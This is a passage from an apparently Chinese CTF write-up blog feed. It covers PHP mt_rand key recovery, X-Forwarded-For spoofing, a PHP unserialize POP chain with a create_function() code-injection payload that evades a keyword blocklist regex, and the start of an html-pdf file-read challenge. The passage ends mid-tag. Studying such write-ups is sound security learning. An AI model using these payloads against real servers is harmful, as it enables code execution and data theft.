class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> *str1 = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;<br>    <span class="hljs-keyword">char</span> *str2 = <span class="hljs-string">&quot;KVQP0LdJKRaV3n9D&quot;</span>; <span class="hljs-comment">//公钥</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(str2) ; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-built_in">strlen</span>(str1) ; j++) &#123;<br>            <span class="hljs-keyword">if</span> ( str2[i] == str1[j] ) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d 0 %d &quot;</span>, j, j, <span class="hljs-built_in">strlen</span>(str1)<span class="hljs-number">-1</span>);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2021/09/28/2021/ctf/24/image-20210929162312335.png" alt="image-20210929162312335"></p><p><img src="/2021/09/28/2021/ctf/24/image-20210929162350213.png" alt="image-20210929162350213"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>mt_srand(<span class="hljs-number">1775196155</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">public_key</span>(<span class="hljs-params">$length = <span class="hljs-number">16</span></span>) </span>&#123;<br>    $strings1 = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    $public_key = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( $i = <span class="hljs-number">0</span>; $i &lt; $length; $i++ )<br>    $public_key .= substr($strings1, mt_rand(<span class="hljs-number">0</span>, strlen($strings1) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> $public_key;<br>&#125;<br><br><span class="hljs-comment">//genarate private_key</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">private_key</span>(<span class="hljs-params">$length = <span class="hljs-number">12</span></span>) </span>&#123;<br>    $strings2 = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    $private_key = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( $i = <span class="hljs-number">0</span>; $i &lt; $length; $i++ )<br>    $private_key .= substr($strings2, mt_rand(<span class="hljs-number">0</span>, strlen($strings2) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> $private_key;<br>&#125;<br>$Public_key = public_key();<br>$y1ng = private_key();<br><span class="hljs-keyword">echo</span> $Public_key . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> $y1ng;<br></code></pre></td></tr></table></figure><p>得到私钥：XuNhoueCDCGc</p><p>有了这个，嘿嘿嘿，可以为所欲为了（不是）</p><h4 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h4><p>万能密码走起</p><p><img src="/2021/09/28/2021/ctf/24/image-20210929162457871.png" alt="image-20210929162457871"></p><p>登录后：</p><p><img src="/2021/09/28/2021/ctf/24/image-20210929162522508.png" alt="image-20210929162522508"></p><h2 id="PYWebsite"><a href="#PYWebsite" class="headerlink" title="PYWebsite"></a>PYWebsite</h2><p>啊，这题感觉有点小无语</p><p><img src="/2021/09/28/2021/ctf/24/image-20210929163657423.png" alt="image-20210929163657423"></p><p>进去之后发现被出题人疯狂嘲讽</p><p><img src="/2021/09/28/2021/ctf/24/image-20210929163738713.png" alt="image-20210929163738713"></p><p>扫这个就被嘲讽还想py？</p><h4 id="md5失败"><a href="#md5失败" class="headerlink" title="md5失败"></a>md5失败</h4><p>老老实实回去页面</p><p><img src="/2021/09/28/2021/ctf/24/image-20210929163835193.png" alt="image-20210929163835193"></p><p>源码里看到这段代码</p><p>我试了半天的md5加密，结果wp和我说这，是，解，不，出，来，的！</p><p>直接访问/flag.php就可以了（不争气的泪水流了下来）</p><p><img src="/2021/09/28/2021/ctf/24/image-20210929164028325.png" alt="image-20210929164028325"></p><p>然后就是这个帅气的表情包</p><p>到这边完全没有思路</p><h4 id="大佬的解题"><a href="#大佬的解题" class="headerlink" title="大佬的解题"></a>大佬的解题</h4><p>Y1ng大佬说是去看js文件</p><p>发现lib/php-mail-form/validate.js中的 JQuery 会发一个 POST 请求</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs routeros">var action = $(this).attr(<span class="hljs-string">&#x27;action&#x27;</span>);<br>    <span class="hljs-keyword">if</span>( ! action ) &#123;<br>      action = <span class="hljs-string">&#x27;contactform/contactform.php&#x27;</span>;<br>    &#125;<br>    <br>    var this_form = $(this);<br>    this_form.<span class="hljs-builtin-name">find</span>(<span class="hljs-string">&#x27;.sent-message&#x27;</span>).slideUp();<br>    this_form.<span class="hljs-builtin-name">find</span>(<span class="hljs-string">&#x27;.error-message&#x27;</span>).slideUp();<br>    this_form.<span class="hljs-builtin-name">find</span>(<span class="hljs-string">&#x27;.loading&#x27;</span>).slideDown();<br>    $.ajax(&#123;<br>      type: <span class="hljs-string">&quot;POST&quot;</span>,<br>      url: action,<br>      data: str,<br>      success: function(msg) &#123;<br>        <span class="hljs-keyword">if</span> (msg == <span class="hljs-string">&#x27;OK&#x27;</span>) &#123;<br>          this_form.<span class="hljs-builtin-name">find</span>(<span class="hljs-string">&#x27;.loading&#x27;</span>).slideUp();<br>          this_form.<span class="hljs-builtin-name">find</span>(<span class="hljs-string">&#x27;.sent-message&#x27;</span>).slideDown();<br>          this_form.<span class="hljs-builtin-name">find</span>(<span class="hljs-string">&quot;input, textarea&quot;</span>).val(<span class="hljs-string">&#x27;&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>          this_form.<span class="hljs-builtin-name">find</span>(<span class="hljs-string">&#x27;.loading&#x27;</span>).slideUp();<br>          this_form.<span class="hljs-builtin-name">find</span>(<span class="hljs-string">&#x27;.error-message&#x27;</span>).slideDown().html(msg);<br>        &#125;<br>      &#125;<br>    &#125;);<br></code></pre></td></tr></table></figure><p>但是请求的目标 contactform/contactform.php 是不存在的，怀疑出题人前段一键白嫖的时候没有仔细检查。</p><p>访问 flag.php 告诉还没买，已经记录了购买者的 ip</p><p>分析代码可知前段那个授权码验证肯定是无效的（就算验证通过后端也不知道），所以购买 flag 肯定是假的。因为记录了购买者的 ip，所以 XFF 伪造一下，得到 flag</p><p><img src="/2021/09/28/2021/ctf/24/image-20210929164307294.png" alt="image-20210929164307294"></p><p><img src="/2021/09/28/2021/ctf/24/image-20210929164320367.png" alt="image-20210929164320367"></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF hellounser</title>
      <link href="/2021/09/25/2021/ctf/23/"/>
      <url>/2021/09/25/2021/ctf/23/</url>
      
        <content type="html"><![CDATA[<p> 源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> $var;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;var;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;show();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $func;<br>    <span class="hljs-keyword">public</span> $arg;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<br>        $func = <span class="hljs-keyword">$this</span>-&gt;func;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;func) || preg_match(<span class="hljs-string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;arg)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No!No!No!&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br>            <span class="hljs-comment">//There is no code to print flag in flag.php</span><br>            $func(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;arg);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;show();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>.<span class="hljs-string">&quot;Nice Job!!&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br><br><br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    $aaa = unserialize($_GET[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>    $aaa();<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="类A"><a href="#类A" class="headerlink" title="类A"></a>类A</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> $var;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;var;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;show();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>类A比较简单</p><p>先定义公共变量</p><h6 id="PHP中的-this用法："><a href="#PHP中的-this用法：" class="headerlink" title="PHP中的$this用法："></a>PHP中的$this用法：</h6><p>this是指向当前对象的指针</p><p><img src="/2021/09/25/2021/ctf/23/image-20210925201706608.png" alt="image-20210925201706608"></p><h6 id="invoke-函数"><a href="#invoke-函数" class="headerlink" title="__invoke()函数"></a>__invoke()函数</h6><p>当以函数方式调用对象时被调用</p><h5 id="类B"><a href="#类B" class="headerlink" title="类B"></a>类B</h5><pre><code>class B&#123;    public $func;    public $arg;public function show()&#123;    $func = $this-&gt;func;    if(preg_match(&#39;/^[a-z0-9]*$/isD&#39;, $this-&gt;func) || preg_match(&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i&#39;, $this-&gt;arg)) &#123;        die(&#39;No!No!No!&#39;);    &#125; else &#123;        include &quot;flag.php&quot;;        //There is no code to print flag in flag.php        $func(&#39;&#39;, $this-&gt;arg);    &#125;&#125;public function __toString()&#123;    $this-&gt;show();    return &quot;&lt;br&gt;&quot;.&quot;Nice Job!!&quot;.&quot;&lt;br&gt;&quot;;&#125;&#125;</code></pre><h6 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h6><p>当对象为字符串时触发</p><p>思路：</p><p>new两个新的a类和b类变量</p><p>然后b类调用create_function函数方法：</p><p><code>create_function()</code>会创建一个匿名函数（<code>lambda</code>样式）。</p><p>create_function()函数会在内部执行 eval()<a href="https://www.cnblogs.com/-qing-/p/10816089.html">代码审计之create_function()函数 - 卿先生 - 博客园 (cnblogs.com)</a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-variable">$b</span>-&gt;<span class="hljs-attribute">arg</span>=<span class="hljs-string">&quot;&#125;require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());//&quot;</span>;<br></code></pre></td></tr></table></figure><p>变量b赋值<br>}这个是为了闭合前面的<br>//这个是为了注释后面的</p><p>base64绕过正则过滤，var_dump输出数据，get_defined_vars()函数返回由所有已定义变量所组成的数组。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-variable">$a</span>-&gt;<span class="hljs-attribute">var</span>=<span class="hljs-variable">$b</span>;<br></code></pre></td></tr></table></figure><p>将b的值与a联系，触发_invoke函数从而触发show()</p><p>最后再序列化a</p><p>不过我们得先找到flag到底在哪个文件里：</p><p>经过热心同学的帮助，今天才懂得 include flag.php 包含的意思</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs css">就相当于现在<span class="hljs-selector-tag">flag</span><span class="hljs-selector-class">.php</span>里面的变量已经同步到我现在这个<span class="hljs-selector-tag">php</span>文件里面<br><br><br><br>比如说我在1<span class="hljs-selector-class">.php</span> 写<span class="hljs-selector-tag">include</span> “<span class="hljs-selector-tag">flag</span><span class="hljs-selector-class">.php</span>”<br><br><br><br>那么这个时候<br><br><br><br><span class="hljs-selector-tag">flag</span><span class="hljs-selector-class">.php</span>里面定义过的变量还有函数<br><br><br><br>我在1<span class="hljs-selector-class">.php</span>里面也可以用<br><br><br></code></pre></td></tr></table></figure><p>所以在赋值时先直接打印当前php文件的变量值(也就是相当于打印flag.php里的内容)</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-variable">$b</span>-&gt;<span class="hljs-attribute">arg</span>=<span class="hljs-string">&quot;&#125;var_dump(get_defined_vars());//&quot;</span>;<br></code></pre></td></tr></table></figure><p><img src="/2021/09/25/2021/ctf/23/image-20210926192749869.png" alt="image-20210926192749869"></p><p>放上exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> $var;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;var;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;show();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $func;<br>    <span class="hljs-keyword">public</span> $arg;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<br>        $func = <span class="hljs-keyword">$this</span>-&gt;func;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;func) || preg_match(<span class="hljs-string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;arg)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No!No!No!&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br>            <span class="hljs-comment">//There is no code to print flag in flag.php</span><br>            $func(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;arg);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;show();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>.<span class="hljs-string">&quot;Nice Job!!&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br><br><br>&#125;<br><br>$a=<span class="hljs-keyword">new</span> A();<br>$b=<span class="hljs-keyword">new</span> B();<br>$b-&gt;func=<span class="hljs-string">&quot;create_function&quot;</span>;<br>$b-&gt;arg=<span class="hljs-string">&quot;&#125;require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());//&quot;</span>;<br>$a-&gt;var=$b;<br><span class="hljs-keyword">echo</span> serialize($a);<br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>跑出pop链</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:1</span><span class="hljs-selector-pseudo">:&quot;A&quot;</span><span class="hljs-selector-pseudo">:1</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;var&quot;</span>;<span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;create_function&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;arg&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">73</span>:<span class="hljs-string">&quot;&#125;require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());//&quot;</span>;&#125;&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2021/09/25/2021/ctf/23/image-20210925200601616.png" alt="image-20210925200601616"></p><p>之后再看看这篇文章</p><p>[php反序列化之pop链_L1ni01-CSDN博客_pop链](<a href="https://blog.csdn.net/weixin_45785288/article/details/109877324#:~:text=POP%E9%93%BE%E4%BB%8B%E7%BB%8D">https://blog.csdn.net/weixin_45785288/article/details/109877324#:~:text=POP链介绍</a> POP 面向属性编程 (Property-Oriented,Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是 从现有运行环境 中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链%2C最终达到攻击者邪恶的目的)</p><p>经过提示知道这题和BJDCTF的ezphp很像</p><h4 id="BJDCTF-Ezphp"><a href="#BJDCTF-Ezphp" class="headerlink" title="BJDCTF Ezphp"></a>BJDCTF Ezphp</h4><p>[<a href="https://www.cnblogs.com/rabbittt/p/13323155.html">BJDCTF2020]EzPHP - Rabbittt - 博客园 (cnblogs.com)</a></p><p>这一篇文章解释了前面闭合的问题:</p><p><img src="/2021/09/25/2021/ctf/23/image-20210926202437436.png" alt="image-20210926202437436"></p><p>这样代码实际就只执行了return $arg  这一句，完成了逃逸</p><p><strong>PHP 的 <code>create_function()</code> 代码注入</strong></p><p><a href="https://www.gem-love.com/ctf/770.html">2020BJDCTF “EzPHP” +Y1ngCTF “Y1ng’s Baby Code” 官方writeup – 颖奇L’Amore (gem-love.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021祥云杯 secrets_of_admin&amp;crwaler_z</title>
      <link href="/2021/09/07/2021/ctf/21/"/>
      <url>/2021/09/07/2021/ctf/21/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/rfrder/article/details/119914746">祥云杯2021 Web复现_feng的博客-CSDN博客</a></p><p>[祥云杯2021 web wp | Z3ratu1’s blog](<a href="https://blog.z3ratu1.cn/%E7%A5%A5%E4%BA%91%E6%9D%AF2021">https://blog.z3ratu1.cn/祥云杯2021</a> wp.html#more)</p><p><a href="https://cbatl.gitee.io/">ly0n - A hard-working boy (gitee.io)</a></p><p><a href="https://www.freebuf.com/articles/system/178150.html">Linux下几种反弹Shell方法的总结与理解 - FreeBuf网络安全行业门户</a></p><p><a href="https://www.wlhhlc.top/posts/20107/#cralwer-z">2021祥云杯WEB-WP | dota_st (wlhhlc.top)</a></p><h4 id="secrets-of-admin"><a href="#secrets-of-admin" class="headerlink" title="secrets_of_admin"></a>secrets_of_admin</h4><p>打开后页面如下：</p><p><img src="/2021/09/07/2021/ctf/21/image-20210908114725080.png" alt="image-20210908114725080"></p><p>database.js里直接给出用户名和密码：</p><p>Username：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">admin</span><br></code></pre></td></tr></table></figure><p>Password：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">e<span class="hljs-number">365655e013</span>ce<span class="hljs-number">7</span>fdbdbf<span class="hljs-number">8</span>f<span class="hljs-number">27</span>b<span class="hljs-number">418</span><span class="hljs-keyword">c</span><span class="hljs-number">8</span>fe<span class="hljs-number">6</span>dc<span class="hljs-number">9354</span>dc<span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">0328</span>fa<span class="hljs-number">02</span>b<span class="hljs-number">0</span>ea<span class="hljs-number">547659645</span><br></code></pre></td></tr></table></figure><p>登录后就有了上传界面</p><p><img src="/2021/09/07/2021/ctf/21/image-20210908114945704.png" alt="image-20210908114945704"></p><p>提示我们上传pdf类型的文件，又只能post传参</p><p>以下直<code>files</code>表可以知道，flag在<code>superuser</code>那里，但是<code>superuser</code>不能用。通过下面三行代码也可以知道，需要把<code>flag</code>给<code>admin</code>用户接摘抄wp（因为我没源码）</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">let</span> filename = await <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DB</span>.</span></span>get<span class="hljs-constructor">File(<span class="hljs-params">token</span>.<span class="hljs-params">username</span>, <span class="hljs-params">req</span>.<span class="hljs-params">params</span>.<span class="hljs-params">id</span>)</span><br>         <span class="hljs-keyword">if</span> (fs.exists<span class="hljs-constructor">Sync(<span class="hljs-params">path</span>.<span class="hljs-params">join</span>(<span class="hljs-params">__dirname</span> , <span class="hljs-string">&quot;../files/&quot;</span>, <span class="hljs-params">filename</span>)</span>))&#123;<br>             return res.send(await read<span class="hljs-constructor">File(<span class="hljs-params">path</span>.<span class="hljs-params">join</span>(<span class="hljs-params">__dirname</span> , <span class="hljs-string">&quot;../files/&quot;</span>, <span class="hljs-params">filename</span>)</span>));<br><br></code></pre></td></tr></table></figure><p>但是/api/files/功能那里需要SSRF。</p><p>通过查找html-pdf库发现它存在一个任意文件读取：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">html-pdf <span class="hljs-keyword">before</span> <span class="hljs-built_in">version</span> <span class="hljs-number">3.0</span><span class="hljs-number">.1</span> is vulnerable <span class="hljs-built_in">to</span> Arbitrary File Read. The package fails <span class="hljs-built_in">to</span> sanitize <span class="hljs-keyword">the</span> HTML input, allowing attackers <span class="hljs-built_in">to</span> exfiltrate server <span class="hljs-built_in">files</span> <span class="hljs-keyword">by</span> supplying malicious HTML code. XHR requests <span 